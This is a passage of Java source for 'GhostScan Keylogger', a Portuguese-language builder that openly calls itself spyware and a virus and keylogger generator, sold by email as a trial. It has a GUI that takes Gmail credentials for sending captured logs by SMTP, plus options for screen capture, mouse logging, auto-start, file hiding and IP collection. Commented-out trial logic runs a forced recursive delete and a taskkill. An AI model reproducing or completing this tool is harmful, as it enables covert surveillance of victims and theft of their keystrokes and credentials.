package prog.spyware;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Font;
import java.awt.Frame;
import java.awt.Robot;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTextField;
import java.util.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.SimpleEmail;


@SuppressWarnings("serial")
public class GhostScan extends JFrame{
	private JLabel label;
	@SuppressWarnings("unused")
	private JPanel panelImg;
	public JTextField ghostText;
	public static String memory = "";
	public static String memory1 = "";
	public String getPath = new File("").getAbsolutePath();
	
	public static void main(String[] args) throws IOException, InterruptedException {
		

		/*String writePath = "cmd /c echo %appdata% > path.txt";
		try {
			
			Thread.sleep(2000);
			Runtime.getRuntime().exec(writePath);
           
        } catch (Exception arg) {
            arg.printStackTrace();
        }
		
		String getPath = new File("").getAbsolutePath();
		FileReader fileRead = new FileReader(getPath+"\\path.txt");
		BufferedReader bufferedRead = new BufferedReader(fileRead);
		String reads = bufferedRead.readLine();
		bufferedRead.close();
		Thread.sleep(500);
		FileReader fileReaders = new FileReader(reads+"\\system.int");
		BufferedReader bufferedReaders = new BufferedReader(fileReaders);
		String readers = bufferedReaders.readLine();
		bufferedReaders.close();
		
		int d = 0;
		if(getDay().equals("01")){d = 01;}if(getDay().equals("02")){d = 02;}
		if(getDay().equals("03")){d = 03;}if(getDay().equals("04")){d = 04;}
		if(getDay().equals("05")){d = 05;}if(getDay().equals("06")){d = 06;}
		if(getDay().equals("07")){d = 07;}if(getDay().equals("08")){d = 8;}
		if(getDay().equals("09")){d = 9;}if(getDay().equals("10")){d = 10;}
		if(getDay().equals("11")){d = 11;}if(getDay().equals("12")){d = 12;}
		if(getDay().equals("13")){d = 13;}if(getDay().equals("14")){d = 14;}
		if(getDay().equals("15")){d = 15;}if(getDay().equals("16")){d = 16;}
		if(getDay().equals("17")){d = 17;}if(getDay().equals("18")){d = 18;}
		if(getDay().equals("19")){d = 19;}if(getDay().equals("20")){d = 20;}
		if(getDay().equals("21")){d = 21;}if(getDay().equals("22")){d = 22;}
		if(getDay().equals("23")){d = 23;}if(getDay().equals("24")){d = 24;}
		if(getDay().equals("25")){d = 25;}if(getDay().equals("26")){d = 26;}
		if(getDay().equals("27")){d = 27;}if(getDay().equals("28")){d = 28;}
		if(getDay().equals("29")){d = 29;}if(getDay().equals("30")){d = 30;}
		if(getDay().equals("31")){d = 31;}
		int s = 0;
		if(readers.equals("1")){s = 1;}else if(readers.equals("2")){s = 2;}else
		if(readers.equals("3")){s = 3;}else if(readers.equals("4")){s = 4;}else
		if(readers.equals("5")){s = 5;}else if(readers.equals("6")){s = 6;}else
		if(readers.equals("7")){s = 7;}else if(readers.equals("8")){s = 8;}else
		if(readers.equals("9")){s = 9;}else if(readers.equals("10")){s = 10;}else
		if(readers.equals("11")){s = 11;}else if(readers.equals("12")){s = 12;}else
		if(readers.equals("13")){s = 13;}else if(readers.equals("14")){s = 14;}else
		if(readers.equals("15")){s = 15;}else if(readers.equals("16")){s = 16;}else
		if(readers.equals("17")){s = 17;}else if(readers.equals("18")){s = 18;}else
		if(readers.equals("19")){s = 19;}else if(readers.equals("20")){s = 20;}else
		if(readers.equals("21")){s = 21;}else if(readers.equals("22")){s = 22;}else
		if(readers.equals("23")){s = 23;}else if(readers.equals("24")){s = 24;}else
		if(readers.equals("25")){s = 25;}else if(readers.equals("26")){s = 26;}else
		if(readers.equals("27")){s = 27;}else if(readers.equals("28")){s = 28;}else
		if(readers.equals("29")){s = 29;}else if(readers.equals("30")){s = 30;}
		
		new Thread(new Runnable(){
			@Override
			public void run(){
				FileWriter Writer;
				try {
					Writer = new FileWriter(reads+"\\system.conf");
					Writer.write("xb0G2*mjK8");
					Writer.close();
				} catch (IOException e) {}
				
			}
		}).start();
		
		FileReader fileReaderx = new FileReader(reads+"\\system.conf");
		BufferedReader bufferedReaderx = new BufferedReader(fileReaderx);
		String readerx = bufferedReaderx.readLine();
		bufferedReaderx.close();
		
		int q = s - d;
		if(d >= s){
			JOptionPane.showMessageDialog(null, "<html><font color='red'>O tempo foi expirado! Para continuar usando o programa, entre em contato no email: </font><font color='green'><a href='https://gmail.com'>bftcorporations@gmail.com</a></font><br>"
					+ "<font color='red'>att.: Lord X</font></html>");
			
			try {
				FileWriter Writerx = new FileWriter(reads+"\\system.conf");
				Writerx.write("h7¨53r99zs");
				Writerx.close();
			} catch (IOException e) {}
			Thread.sleep(10000);
			Runtime.getRuntime().exec("CMD /c del C:\\keylog\\*.* /f /s /q");
			Runtime.getRuntime().exec("CMD /c taskkill /f /im javaw.exe");
		}else{
			JOptionPane.showMessageDialog(null, "<html><font color='red'>Atenção!Como esta é a versão pra teste, você tem apenas "+q+" dias pra usar o programa!<br>"
					+ "Caso queira o uso permanente, negocie pelo email:</font><font color='green'> bftcorporations@gmail.com</font><br><font color='red'>att.: Lord X</font></html>");
		if(readerx.equals("xb0G2*mjK8")){
		File dirs = new File("C:\\");
		File aDirs[] = dirs.listFiles();
		int is = 0;
		for(int js = aDirs.length; is < js; is++){
			File arquivoss = aDirs[is];
			String arss = arquivoss.getName();
			if(arss.equals("Java")){
				memory = arss;
				break;
			}
		}
		
		if(memory.contains("Java")){
			File dir = new File("C:\\Java");
			File aDir[] = dir.listFiles();
			int i = 0;
			for(int j = aDir.length; i < j; i++){
				File arquivos = aDir[i];
				String ars = arquivos.getName();
				if(ars.startsWith("jdk")){
					memory1 = "C:\\Java\\"+ars;
					break;
				}
			}
			
		}else{
			File dir = new File("C:\\Program Files\\Java");
			File aDir[] = dir.listFiles();
			int i = 0;
			for(int j = aDir.length; i < j; i++){
				File arquivos = aDir[i];
				String ars = arquivos.getName();
				if(ars.startsWith("jdk")){
					memory1 = "C:\\Program Files\\Java\\"+ars;
					break;
				}
			}
	
			
		}
		
		
		
		PrintWriter printConfig;
		
		try {
			printConfig = new PrintWriter(new File("C:/keylog/config.bat"));
			printConfig.println("@echo off");
			printConfig.println("echo 0b030g1 > C:\\keylog\\arquivo.gs");
			printConfig.println("SETX JAVA_HOME "+'"'+memory1+'"'+" -m");
			printConfig.println("SETX PATH "+'"'+";"+memory1+"\\bin;C:;C:\\WINDOWS;C:\\WINDOWS\\system32"+'"'+" -m");
			printConfig.println("SETX CLASSPATH "+'"'+";"+memory1+"\\lib;"+memory1+"\\lib\\tools.jar;"+memory1+"\\lib\\dt.jar;"+memory1+"\\lib\\htmlconverter.jar;"+memory1+"\\jre\\lib;"+memory1+"\\jre\\lib\\rt.jar;"+'"'+" -m");
			
			printConfig.close();
		} catch (FileNotFoundException e) {
			
			e.printStackTrace();
		}
		
		String openConfig = "CMD /c C:\\keylog\\configInit.lnk";
		
		
		
		try {
			Thread.sleep(1000);
			Runtime.getRuntime().exec(openConfig);
			Thread.sleep(3000);
			
		} catch (IOException e) {
			
		}
		catch (InterruptedException e) {
			
		}
		
		String line = "";
		File file1 = new File("C:\\keylog\\arquivo.gs");
		FileReader reader;
		try {
			reader = new FileReader(file1);
			BufferedReader read = new BufferedReader(reader);
			line = read.readLine();
			read.close();
		} catch (FileNotFoundException e) {
		
			e.printStackTrace();
		} catch (IOException e) {
		
			e.printStackTrace();
		}
		
		
		
		if(line.contains("0b030g1")){*/
			GhostScan gs = new GhostScan();
			gs.setVisible(true);
		/*}
		
		try {
			FileWriter writ = new FileWriter("C:\\keylog\\arquivo.gs");
			writ.write("0b130g0");
			writ.close();
		} catch (IOException e) {
			
			e.printStackTrace();
		}
		
		}
	}*/
	
	}
	
	@SuppressWarnings("unused")
	private String getDateTime() { 
		DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss"); 
		Date date = new Date(); 
		return dateFormat.format(date); 
	}
	
	private static String getDay() { 
		DateFormat dateFormats = new SimpleDateFormat("dd"); 
		Date dates = new Date(); 
		return dateFormats.format(dates); 
	}
	
	public GhostScan(){
		
		String pathStr = new File("").getAbsolutePath();
		
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		this.setBounds(350, 150, 500, 500);
		this.setTitle("GhostScan Keylogger");
		
		ImageIcon icon;
		
		if(pathStr.contains("/prog/spyware")){
			icon = new ImageIcon(getClass().getResource("/image/scan.jpg"));
			this.setIconImage(icon.getImage());
		}else{
			
			icon = new ImageIcon("/image/scan.jpg");
			this.setIconImage(icon.getImage());
		}
		
		
		
		
		 
		JPanel panel = new JPanel();
		this.add(panel);
		panel.setBackground(Color.gray);
		
		
		
		label = new JLabel();
		label.setText("<html><div width='613' height='595'></div></html>");
		label.setBounds(0, 2, 380, 55);
		panel.add(label);
		
		ImageIcon image, image1, image2;
		if(pathStr.contains("projects\\Hacking_Programs")){
			image = new ImageIcon(getClass().getResource("/image/ghostscan.jpg"));
			image1 = new ImageIcon(getClass().getResource("/image/inicio1.png"));
			image2 = new ImageIcon(getClass().getResource("/image/inicio2.png"));
		}else{
			image = new ImageIcon("image/ghostscan.jpg");
			image1 = new ImageIcon("image/inicio1.png");
			image2 = new ImageIcon("image/inicio2.png");
		}

		
		
		JPanel blackPanel = new JPanel();
		blackPanel.setBackground(Color.black);
		blackPanel.setBounds(30, 425, 525, 30);
		label.add(blackPanel);
		
		
		
		
		JLabel lines = new JLabel();
		lines.setText("<html><div bgcolor='black' width='313' height='595'></div></html>");
		lines.setBounds(345, 240, 195, 180);
		label.add(lines);
		
		
		
		JCheckBox ghostWare = new JCheckBox();
		ghostWare.setBounds(10, 30, 20, 20);
		ghostWare.setBackground(Color.black);
		ghostWare.setForeground(Color.green);
		ghostWare.setVisible(true);
		lines.add(ghostWare);
		
		
		
		
		JLabel ghostLabel = new JLabel();
		ghostLabel.setBounds(30, 30, 90, 20);
		ghostLabel.setText("Ghost");
		ghostLabel.setForeground(Color.white);
		lines.add(ghostLabel);
		
		JLabel nomeGhost = new JLabel();
		nomeGhost.setBounds(10, 50, 90, 20);
		nomeGhost.setText("Nome:");
		lines.add(nomeGhost);
		
		ghostText = new JTextField();
		ghostText.setBounds(60, 50, 120, 20);
		ghostText.setForeground(Color.blue);
		lines.add(ghostText);
		
		
		
		
		
		
		JCheckBox scorpion = new JCheckBox();
		scorpion.setBounds(10, 70, 20, 20);
		scorpion.setBackground(Color.black);
		scorpion.setForeground(Color.green);
		lines.add(scorpion);
		
		JLabel scorpionLabel = new JLabel();
		scorpionLabel.setBounds(30, 70, 90, 20);
		scorpionLabel.setText("Scorpion");
		scorpionLabel.setForeground(Color.white);
		lines.add(scorpionLabel);
		
		JLabel nomeScorpion = new JLabel();
		nomeScorpion.setBounds(10, 90, 90, 20);
		nomeScorpion.setText("Nome:");
		lines.add(nomeScorpion);
		
		JTextField scorpionText = new JTextField();
		scorpionText.setBounds(60, 90, 120, 20);
		scorpionText.setForeground(Color.blue);
		lines.add(scorpionText);
		
		
		
		
		JCheckBox block = new JCheckBox();
		block.setBounds(10, 110, 20, 20);
		block.setBackground(Color.black);
		block.setForeground(Color.green);
		lines.add(block);
		
		JLabel blockLabel = new JLabel();
		blockLabel.setBounds(30, 110, 90, 20);
		blockLabel.setText("Blocker");
		blockLabel.setForeground(Color.white);
		lines.add(blockLabel);
		
		JLabel nomeBlock = new JLabel();
		nomeBlock.setBounds(10, 130, 90, 20);
		nomeBlock.setText("Nome:");
		lines.add(nomeBlock);
		
		JTextField blockText = new JTextField();
		blockText.setBounds(60, 130, 120, 20);
		blockText.setForeground(Color.blue);
		lines.add(blockText);
		
		
		
		
		JButton generate = new JButton();
		generate.setText("Generate");
		generate.setBounds(90, 155, 90, 20);
		lines.add(generate);
		
		JLabel msg = new JLabel();
		msg.setText(null);
		msg.setForeground(Color.green);
		blackPanel.add(msg);
		
		JLabel img = new JLabel(image);
		img.setBounds(10, 10, 590, 190);
		label.add(img);
		
		JLabel imgInicio1 = new JLabel(image1);
		imgInicio1.setBounds(70, 200, 100, 30);
		imgInicio1.setVisible(false);
		label.add(imgInicio1);
		
		JLabel imgInicio2 = new JLabel(image2);
		imgInicio2.setBounds(70, 200, 100, 30);
		imgInicio2.setVisible(true);
		label.add(imgInicio2);
		
		JLabel emaillabel = new JLabel();
		emaillabel.setText("Email:");
		emaillabel.setBounds(80, 270, 50, 20);
		emaillabel.setForeground(Color.black);
		label.add(emaillabel);
		
		JTextField campoemail = new JTextField();
		campoemail.setBounds(135, 270, 200, 20);
		campoemail.setText("Digite seu email aqui");
		campoemail.setForeground(Color.white);
		campoemail.setBackground(Color.black);
		label.add(campoemail);
		
		JLabel senhalabel = new JLabel();
		senhalabel.setText("senha:");
		senhalabel.setBounds(80, 300, 50, 20);
		senhalabel.setForeground(Color.black);
		label.add(senhalabel);
		
		
		JTextField senha = new JTextField();
		senha.setBounds(135, 300, 200, 20);
		senha.setText("Digite sua senha aqui");
		senha.setForeground(Color.white);
		senha.setBackground(Color.BLACK);
		label.add(senha);
		
		JLabel linkInfo = new JLabel();
		linkInfo.setText("Clique aqui");
		linkInfo.setBounds(210, 345, 230, 20);
		linkInfo.setForeground(Color.blue);
		linkInfo.setVisible(false);
		label.add(linkInfo);
		
		linkInfo.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				linkInfo.setForeground(Color.white);
				String source = "cmd /c document\\tutorial.hta";
				try {
					Runtime.getRuntime().exec(source);
				} catch (IOException e) {
					
					e.printStackTrace();
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				linkInfo.setForeground(Color.blue);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				
				linkInfo.setForeground(Color.red);
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				
			}
		});
		
		JLabel informations = new JLabel();
		informations.setBounds(80, 230, 270, 200);
		informations.setVisible(false);
		informations.setText("<html><font color='white'>Nome:</font> GhostScan<br>"
				+ "<font color='white'>Tipo:</font> Spyware & Malware<br>"
				+ "<font color='white'>Função:</font> Gerador de virus & Keylogger<br>"
				+ "<font color='white'>Atualização disponível:</font> nenhuma<br>"
				+ "<font color='white'>Versão:</font> 1.0<br>"
				+ "<font color='white'>Criado por:</font> Lord X<br>"
				+ "<font color='white'>Empresa:</font> BFT(Brute Force Technology)<br>"
				+ "<font color='white'>Tutorial do Programa:</font>"
				+ "<br><font color='gray'></font><font color='white'>*****Informações importantes*****</font>"
				+ "<br>Os arquivos keyloggers ou virus serão gerados na pasta padrão do programa,"
				+ "porém poderá ser executado em qualquer lugar.</html>");
		informations.setForeground(Color.black);
		label.add(informations);

		JLabel caminholabel = new JLabel();
		caminholabel.setText("Keylogger:");
		caminholabel.setBounds(70, 330, 70, 20);
		caminholabel.setForeground(Color.black);
		label.add(caminholabel);
		
		JTextField caminho = new JTextField();
		caminho.setBounds(135, 330, 200, 20);
		caminho.setForeground(Color.white);
		caminho.setBackground(Color.black);
		caminho.setText("Digite o nome do arquivo");
		label.add(caminho);
		
		JButton salvar = new JButton();
		salvar.setBounds(210, 360, 125, 20);
		salvar.setText("Criar Keylogger");
		salvar.setForeground(Color.LIGHT_GRAY);
		salvar.setBackground(Color.DARK_GRAY);
		label.add(salvar);
		
		JButton testar = new JButton();
		testar.setBounds(70, 360, 125, 20);
		testar.setText("testar conexão");
		testar.setForeground(Color.blue);
		testar.setBackground(Color.green);
		label.add(testar);
		
		testar.addActionListener(new ActionListener() {
			
			@SuppressWarnings("deprecation")
			@Override
			public void actionPerformed(ActionEvent arg0) {
				SimpleEmail email = new SimpleEmail();
				   
				   email.setHostName("smtp.gmail.com");
				   email.setSmtpPort(465);
				   try {
					email.addTo(campoemail.getText(), "X");
				} catch (EmailException e3) {
					
					e3.printStackTrace();
				}
				   try {
					email.setFrom(campoemail.getText(), "X");
				} catch (EmailException e2) {
					
					e2.printStackTrace();
				}
				   email.setSubject("Teste GhostScan");
				   try {
					email.setMsg("Este é o email de teste de\n"
					   		+ "Conexão do ghostScan,se recebeu esta\n"
					   		+ "mensagem, é porque a conexão está ativa e\n"
					   		+ "o keylogger funcionará corretamente!\n\n"
					   		+ ""
					   		+ "Agradecimentos GhostScan Keylogger -"
					   		+ "created by X");
				} catch (EmailException e1) {
					
					e1.printStackTrace();
				}
				   boolean conexao = false;
				   email.setSSL(true);
				   email.setAuthentication(campoemail.getText(), senha.getText());
				   try {
					email.send();
					conexao = true;
					
				} catch (EmailException e) {
					
					e.printStackTrace();
				}
		
				   if(conexao==true){
						msg.setText("O teste foi enviado com sucesso!");
						msg.setForeground(Color.green);
					}else{
						msg.setText("Falha na conexão - corrija o email ou verifique a internet e tente novamente!");
						msg.setForeground(Color.red);
					
						
					}
				
			}
		});
		
		
		JCheckBox check = new JCheckBox();
		check.setBounds(80, 270, 20, 20);
		check.setBackground(Color.gray);
		check.setForeground(Color.green);
		check.setVisible(false);
		label.add(check);
		
		JCheckBox check1 = new JCheckBox();
		check1.setBounds(80, 290, 20, 20);
		check1.setBackground(Color.gray);
		check1.setForeground(Color.green);
		check1.setVisible(false);
		label.add(check1);
		
		JCheckBox check2 = new JCheckBox();
		check2.setBounds(80, 380, 20, 20);
		check2.setBackground(Color.gray);
		check2.setForeground(Color.green);
		check2.setVisible(false);
		label.add(check2);
		
		JCheckBox check3 = new JCheckBox();
		check3.setBounds(80, 360, 20, 20);
		check3.setBackground(Color.gray);
		check3.setForeground(Color.green);
		check3.setVisible(false);
		label.add(check3);
		
		JCheckBox checkIp = new JCheckBox();
		checkIp.setBounds(300, 270, 20, 20);
		checkIp.setBackground(Color.gray);
		checkIp.setForeground(Color.green);
		checkIp.setVisible(false);
		label.add(checkIp);
		
		JCheckBox checkRede = new JCheckBox();
		checkRede.setBounds(300, 290, 20, 20);
		checkRede.setBackground(Color.gray);
		checkRede.setForeground(Color.green);
		checkRede.setVisible(false);
		label.add(checkRede);
		
		
		JLabel keylogOptions = new JLabel();
		keylogOptions.setText("Informações de Envios");
		keylogOptions.setBounds(80, 240, 200, 20);
		keylogOptions.setForeground(Color.black);
		keylogOptions.setVisible(false);
		label.add(keylogOptions);
		
		JLabel keyvirOptions = new JLabel();
		keyvirOptions.setText("Sistema de Camuflagens");
		keyvirOptions.setBounds(80, 330, 200, 20);
		keyvirOptions.setForeground(Color.black);
		keyvirOptions.setVisible(false);
		label.add(keyvirOptions);
		
		
		JPanel linha1 = new JPanel();
		linha1.setBounds(280, 235, 1, 180);
		linha1.setBackground(Color.DARK_GRAY);
		linha1.setVisible(false);
		label.add(linha1);
		
		JPanel linha2 = new JPanel();
		linha2.setBounds(80, 330, 450, 1);
		linha2.setBackground(Color.DARK_GRAY);
		linha2.setVisible(false);
		label.add(linha2);
		
		JLabel executeTime = new JLabel();
		executeTime.setText("Tempo de execução");
		executeTime.setBounds(300, 330, 200, 20);
		executeTime.setForeground(Color.black);
		executeTime.setVisible(false);
		label.add(executeTime);
		
		Date date = new Date();
		String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);
		String subDate = strDate.substring(0);
		
		JLabel Time = new JLabel();
		Time.setText("Data Atual: "+subDate);
		Time.setBounds(300, 350, 200, 20);
		Time.setForeground(Color.black);
		Time.setVisible(false);
		label.add(Time);
		
		
		
		
		JLabel infoPc = new JLabel();
		infoPc.setText("Propriedades do sistema");
		infoPc.setBounds(300, 240, 220, 20);
		infoPc.setForeground(Color.black);
		infoPc.setVisible(false);
		label.add(infoPc);
		
		JLabel label1 = new JLabel();
		label1.setText("Registro do mouse");
		label1.setBounds(105, 270, 200, 20);
		label1.setVisible(false);
		label.add(label1);
		
		JLabel label2 = new JLabel();
		label2.setText("Captura de tela");
		label2.setBounds(105, 290, 200, 20);
		label2.setVisible(false);
		label.add(label2);
		
		JLabel label3 = new JLabel();
		label3.setText("Inicialização automática");
		label3.setBounds(105, 360, 200, 20);
		label3.setVisible(false);
		label.add(label3);
		
		JLabel label4 = new JLabel();
		label4.setText("Ocultar arquivo");
		label4.setBounds(105, 380, 200, 20);
		label4.setVisible(false);
		label.add(label4);
		
		JLabel labelIp = new JLabel();
		labelIp.setText("Obter Endereço Ip");
		labelIp.setBounds(325, 270, 200, 20);
		labelIp.setVisible(false);
		label.add(labelIp);
		
		JLabel labelExec = new JLabel();
		labelExec.setText("Execução até:");
		labelExec.setBounds(315, 370, 200, 20);
		labelExec.setVisible(false);
		label.add(labelExec);
		
		JTextField textExec = new JTextField();
		textExec.setBounds(400, 370, 105, 20);
		textExec.setVisible(false);
		label.add(textExec);
		

		
		JLabel labelRede = new JLabel();
		labelRede.setText("Informações de rede");
		labelRede.setBounds(325, 290, 200, 20);
		labelRede.setVisible(false);
		label.add(labelRede);
		
		JRadioButton radioKey = new JRadioButton();
		radioKey.setBounds(70, 240, 20, 20);
		radioKey.setBackground(Color.gray);
		radioKey.setSelected(true);
		radioKey.setEnabled(false);
		label.add(radioKey);
		
		JLabel keyGenerator = new JLabel();
		keyGenerator.setText("Gerador de keylogger");
		keyGenerator.setFont(new Font("Calibri", 1, 15));
		keyGenerator.setBounds(100, 235, 150, 30); 
		keyGenerator.setForeground(Color.white);
		label.add(keyGenerator);
		
		JRadioButton radioVir = new JRadioButton();
		radioVir.setBounds(5, 2, 20, 20);
		radioVir.setBackground(Color.black);
		lines.add(radioVir);
		
		//Initial padronized lock virus generate
		ghostText.setBackground(Color.LIGHT_GRAY);
		scorpionText.setBackground(Color.LIGHT_GRAY);
		blockText.setBackground(Color.LIGHT_GRAY);
		ghostLabel.setForeground(null);
		scorpionLabel.setForeground(null);
		blockLabel.setForeground(null);
		nomeGhost.setForeground(null);
		nomeScorpion.setForeground(null);
		nomeBlock.setForeground(null);
		ghostWare.setEnabled(false);
		scorpion.setEnabled(false);
		block.setEnabled(false);
		ghostWare.setSelected(false);
		scorpion.setSelected(false);
		block.setSelected(false);
		ghostText.setEnabled(false);
		scorpionText.setEnabled(false);
		blockText.setEnabled(false);
		generate.setEnabled(false);
		
		JLabel virusGenerator = new JLabel();
		virusGenerator.setText("Gerador de virus");
		virusGenerator.setFont(new Font("Calibri", 1, 15));
		virusGenerator.setBounds(30, -3, 150, 30); 
		virusGenerator.setForeground(Color.white);
		lines.add(virusGenerator);
		
		//Rv
		radioVir.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
			
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				if(radioVir.isSelected()){
					
				}else{
					//if clicked radioVir make this...
					radioKey.setSelected(false);
					radioVir.setSelected(true);
					radioVir.setEnabled(false);
					radioKey.setEnabled(true);
					//lock keylogger generate
					emaillabel.setForeground(Color.LIGHT_GRAY);
					senhalabel.setForeground(Color.LIGHT_GRAY);
					caminholabel.setForeground(Color.LIGHT_GRAY);
					campoemail.setBackground(Color.LIGHT_GRAY);
					senha.setBackground(Color.LIGHT_GRAY);
					caminho.setBackground(Color.LIGHT_GRAY);
					campoemail.setEnabled(false);
					senha.setEnabled(false);
					caminho.setEnabled(false);
					salvar.setEnabled(false);
					testar.setEnabled(false);
					
					
					//unlock virus generate
				
					ghostText.setBackground(Color.LIGHT_GRAY);
					scorpionText.setBackground(Color.LIGHT_GRAY);
					blockText.setBackground(Color.LIGHT_GRAY);
					ghostLabel.setForeground(Color.white);
					scorpionLabel.setForeground(Color.white);
					blockLabel.setForeground(Color.white);
					nomeGhost.setForeground(Color.white);
					nomeScorpion.setForeground(Color.white);
					nomeBlock.setForeground(Color.white);
					ghostWare.setEnabled(true);
					scorpion.setEnabled(true);
					block.setEnabled(true);
					ghostText.setEnabled(false);
					scorpionText.setEnabled(false);
					blockText.setEnabled(false);
					generate.setEnabled(true);
					
					
					
					
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
			
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
			}
		});
		
		//Rk
		radioKey.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				if(radioKey.isSelected()){
					
				}else{
					//if clicked radioKey make this
					radioVir.setSelected(false);
					radioKey.setSelected(true);
					radioKey.setEnabled(false);
					radioVir.setEnabled(true);
					//unlock keylogger generate
					emaillabel.setForeground(Color.black);
					senhalabel.setForeground(Color.BLACK);
					caminholabel.setForeground(Color.black);
					campoemail.setBackground(Color.black);
					senha.setBackground(Color.black);
					caminho.setBackground(Color.BLACK);
					campoemail.setEnabled(true);
					senha.setEnabled(true);
					caminho.setEnabled(true);
					salvar.setEnabled(true);
					testar.setEnabled(true);
					
					
					//lock virus generate
					ghostText.setBackground(Color.LIGHT_GRAY);
					scorpionText.setBackground(Color.LIGHT_GRAY);
					blockText.setBackground(Color.LIGHT_GRAY);
					ghostLabel.setForeground(null);
					scorpionLabel.setForeground(null);
					blockLabel.setForeground(null);
					nomeGhost.setForeground(null);
					nomeScorpion.setForeground(null);
					nomeBlock.setForeground(null);
					ghostWare.setEnabled(false);
					scorpion.setEnabled(false);
					block.setEnabled(false);
					ghostWare.setSelected(false);
					scorpion.setSelected(false);
					block.setSelected(false);
					ghostText.setEnabled(false);
					scorpionText.setEnabled(false);
					blockText.setEnabled(false);
					generate.setEnabled(false);
				}
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
			
				
			}
		});
		
		
		//CheckBox ghostware
		ghostWare.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				//if CheckBox is clicked make this...
				//if CheckBox is unlock make this...
				if(ghostWare.isEnabled()){
					if(ghostWare.isSelected()){
						//no clicked
						ghostText.setBackground(Color.LIGHT_GRAY);
						ghostText.setEnabled(false);
						
					}else{
						//clicked
						ghostText.setBackground(Color.white);
						ghostText.setEnabled(true);
					}
				}
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
			
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		//CheckBox scorpion
				scorpion.addMouseListener(new MouseListener() {
					
					@Override
					public void mouseReleased(MouseEvent e) {
						
						
					}
					
					@Override
					public void mousePressed(MouseEvent e) {
						//if CheckBox is clicked make this...
						//if CheckBox is unlock make this...
						if(scorpion.isEnabled()){
							if(scorpion.isSelected()){
								//no clicked
								scorpionText.setBackground(Color.LIGHT_GRAY);
								scorpionText.setEnabled(false);
								
							}else{
								//clicked
								scorpionText.setBackground(Color.white);
								scorpionText.setEnabled(true);
							}
						}
					}
					
					@Override
					public void mouseExited(MouseEvent e) {
						
						
					}
					
					@Override
					public void mouseEntered(MouseEvent e) {
						
						
					}
					
					@Override
					public void mouseClicked(MouseEvent e) {
					
						
					}
				});
		
				//CheckBox block
				block.addMouseListener(new MouseListener() {
					
					@Override
					public void mouseReleased(MouseEvent e) {
						
						
					}
					
					@Override
					public void mousePressed(MouseEvent e) {
						//if CheckBox is clicked make this...
						//if CheckBox is unlock make this...
						if(block.isEnabled()){
							if(block.isSelected()){
								//no clicked
								blockText.setBackground(Color.LIGHT_GRAY);
								blockText.setEnabled(false);
								
							}else{
								//clicked
								blockText.setBackground(Color.white);
								blockText.setEnabled(true);
							}
						}
					}
					
					@Override
					public void mouseExited(MouseEvent e) {
						
						
					}
					
					@Override
					public void mouseEntered(MouseEvent e) {
					
						
					}
					
					@Override
					public void mouseClicked(MouseEvent e) {
						
						
					}
				});
				
		imgInicio1.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				lines.setVisible(true);
				keyGenerator.setVisible(true);
				radioKey.setVisible(true);
				emaillabel.setVisible(true);
				campoemail.setVisible(true);
				senhalabel.setVisible(true);
				senha.setVisible(true);
				caminholabel.setVisible(true);
				caminho.setVisible(true);
				salvar.setVisible(true);
				testar.setVisible(true);
				
				check.setVisible(false);
				check1.setVisible(false);
				check2.setVisible(false);
				label1.setVisible(false);
				label2.setVisible(false);
				label3.setVisible(false);
				check3.setVisible(false);
				label4.setVisible(false);
				keylogOptions.setVisible(false);
				keyvirOptions.setVisible(false);
				executeTime.setVisible(false);
				linha1.setVisible(false);
				linha2.setVisible(false);
				infoPc.setVisible(false);
				checkIp.setVisible(false);
				checkRede.setVisible(false);
				labelIp.setVisible(false);
				labelRede.setVisible(false);
				labelExec.setVisible(false);
				textExec.setVisible(false);
				Time.setVisible(false);
				linkInfo.setVisible(false);
				informations.setVisible(false);
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				imgInicio1.setVisible(false);
				imgInicio2.setVisible(true);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				
			}
		});
		
		imgInicio2.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				lines.setVisible(true);
